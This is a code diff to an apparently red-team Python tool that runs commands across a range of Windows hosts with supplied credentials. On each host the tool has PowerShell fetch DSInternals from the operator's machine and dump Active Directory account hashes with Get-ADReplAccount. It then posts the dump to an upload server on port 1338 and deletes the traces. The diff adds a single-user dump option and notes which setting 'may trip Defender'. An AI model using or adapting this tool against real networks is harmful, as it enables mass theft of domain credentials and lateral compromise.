@@ -4,6 +4,7 @@ import threading
 import subprocess
 import argparse
 import re
+import socket
 import string
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -11,7 +12,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
 DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
 EXEC_SCRIPT = "exec_across_windows.py"
-UPLOAD_DIR = "./teamcreds/"
+UPLOAD_DIR = "./secretsdump_ng_out/"
 
 
 def parse_ip_range(ip_range):
@@ -40,16 +41,15 @@ def parse_ip_range(ip_range):
     ]
 
 
-def get_kali_ip():
-    """Get the IP address of eth0 interface"""
-    cmd = (
-        "ip addr show dev eth0 | "
-        "grep 'inet ' | grep -v 'secondary' | "
-        "sed 's/^.*inet //g' | sed 's/\\/.*$//g'"
-    )
+def get_host_ip_given_target(target_ip):
+    """Get the local IP address used to reach a target IP"""
     try:
-        return subprocess.check_output(["bash", "-c", cmd]).decode().strip()
-    except subprocess.CalledProcessError:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((target_ip, 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception as e:
         return None
 
 
@@ -197,32 +197,38 @@ class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
 
 def start_upload_server():
     """Start HTTP server for receiving credential uploads on port 1338"""
-    server = HTTPServer(("0.0.0.0", 1338), FileUploadHTTPRequestHandler)
-    server.serve_forever()
-
-
-def start_file_server():
-    """Start HTTP file server on port 1337"""
-    server = HTTPServer(("0.0.0.0", 1337), SimpleHTTPRequestHandler)
+    # Serve files from UPLOAD_DIR
+    class CustomHandler(FileUploadHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=UPLOAD_DIR, **kwargs)
+    
+    server = HTTPServer(("0.0.0.0", 1338), CustomHandler)
     server.serve_forever()
 
 
 print_lock = threading.Lock()
 
 
-def generate_command(ip, kali_ip, username, password):
+def generate_command(ip, username, password, just_dc_user, verbose, show_output):
     """Generate and execute PowerShell command for target"""
-    team_number = ip.split('.')[2] + "_" + ip.split('.')[3]
+
+    host_ip = get_host_ip_given_target(ip)
+
+    # Build Get-ADReplAccount command
+    if just_dc_user:
+        repl_cmd = f"Get-ADReplAccount -Server LOCALHOST -SamAccountName {just_dc_user}"
+    else:
+        repl_cmd = "Get-ADReplAccount -All -Server LOCALHOST"
 
     ps_cmd = (
-        f'iwr http://{kali_ip}:1337/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip; '
+        f'iwr http://{host_ip}:1338/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip; '
         f'Expand-Archive C:\\ProgramData\\DSInternals.zip -d C:\\ProgramData\\DSInternals\\; '
         f'Import-Module C:\\ProgramData\\DSInternals\\DSInternals\\DSInternals.psd1; '
-        f'Get-ADReplAccount -All -Server LOCALHOST > C:\\ProgramData\\ntds_{team_number}.out; '
-        f'iwr -Uri "http://{kali_ip}:1338/upload" -Method Post '
-        f'-InFile "C:\\ProgramData\\ntds_{team_number}.out" '
-        f'-Headers @{{"filename"="ntds_{team_number}.out"}} -UseBasicParsing; '
-        f'del C:\\ProgramData\\ntds_{team_number}.out; '
+        f'{repl_cmd} > C:\\ProgramData\\ntds_{ip}.out; '
+        f'iwr -Uri "http://{host_ip}:1338/upload" -Method Post '
+        f'-InFile "C:\\ProgramData\\ntds_{ip}.out" '
+        f'-Headers @{{"filename"="ntds_{ip}.out"}} -UseBasicParsing; '
+        f'del C:\\ProgramData\\ntds_{ip}.out; '
         f'del C:\\ProgramData\\DSInternals.zip; '
         f'Remove-Item -Recurse -Force C:\\ProgramData\\DSInternals\\'
     )
@@ -234,19 +240,32 @@ def generate_command(ip, kali_ip, username, password):
         "--timeout", "30",
         "--threads", "1"
     ]
+    
+    # Add -o flag if show_output is enabled
+    if show_output:
+        exec_cmd.append("-o")
 
     try:
-        subprocess.run(exec_cmd)
+        if verbose:
+            # Show output
+            subprocess.run(exec_cmd)
+        else:
+            # Suppress output
+            subprocess.run(exec_cmd, capture_output=True)
     except Exception as e:
         with print_lock:
             print(f"[!] Error on {ip}: {e}")
 
+
 def main(args):
     """Main execution function"""
-    if not os.path.exists(DSINTERNALS_ZIP):
+    
+    dsinternals_path = os.path.join(UPLOAD_DIR, DSINTERNALS_ZIP)
+    
+    if not os.path.exists(dsinternals_path):
         print("[*] Downloading DSInternals...")
         try:
-            subprocess.check_call(["wget", "-q", DSINTERNALS_URL])
+            subprocess.check_call(["wget", "-q", "-O", dsinternals_path, DSINTERNALS_URL])
         except subprocess.CalledProcessError:
             print("[!] Failed to download DSInternals. Please download manually.")
             return
@@ -255,32 +274,34 @@ def main(args):
         print(f"[!] {EXEC_SCRIPT} not found. Please ensure it exists.")
         return
 
-    print("[*] Starting HTTP servers...")
-    print("[*] File server listening on port 1337")
-    print("[*] Upload server listening on port 1338")
-    threading.Thread(target=start_file_server, daemon=True).start()
+    print("[*] Starting HTTP server...")
+    print("[*] File and upload server listening on port 1338")
     threading.Thread(target=start_upload_server, daemon=True).start()
 
     targets = parse_ip_range(args.ip_range)
     print(f"[*] Targeting {len(targets)} hosts")
     print(f"[*] Using credentials: {args.username}")
-    print(f"[*] Kali IP: {args.kali_ip}\n")
+    if args.just_dc_user:
+        print(f"[*] Dumping only user: {args.just_dc_user}")
+    print(f"[*] Credentials will be saved within: {os.path.abspath(UPLOAD_DIR)}/\n")
 
     with ThreadPoolExecutor(max_workers=args.threads) as pool:
         futures = [
             pool.submit(
                 generate_command,
                 ip,
-                args.kali_ip,
                 args.username,
-                args.password
+                args.password,
+                args.just_dc_user,
+                args.verbose,
+                args.show_output
             )
             for ip in targets
         ]
         for _ in as_completed(futures):
             pass
 
-    print("\n[*] All tasks completed. Servers still running.")
+    print("\n[*] All tasks completed. Server still running.")
     print("[*] Press Ctrl+C to exit.")
     
     try:
@@ -303,15 +324,13 @@ if __name__ == "__main__":
 
     parser.add_argument("-t", "--threads", type=int, default=10,
                         help="Number of concurrent threads (default: 10)")
-    parser.add_argument("-k", "--kali-ip", default=None,
-                        help="Kali IP address (auto-detected if not provided)")
+    parser.add_argument("-just-dc-user", dest="just_dc_user", 
+                        help="Extract only one user (mimics secretsdump)")
+    parser.add_argument("-v", "--verbose", action="store_true",
+                        help="Show exec_across_windows output")
+    parser.add_argument("-o", "--show-output", action="store_true",
+                        help="Show command output from target (may trip Defender)")
 
     args = parser.parse_args()
-
-    if args.kali_ip is None:
-        args.kali_ip = get_kali_ip()
-        if args.kali_ip is None:
-            print("[!] Could not auto-detect Kali IP. Please specify with -k")
-            exit(1)
 
     main(args)
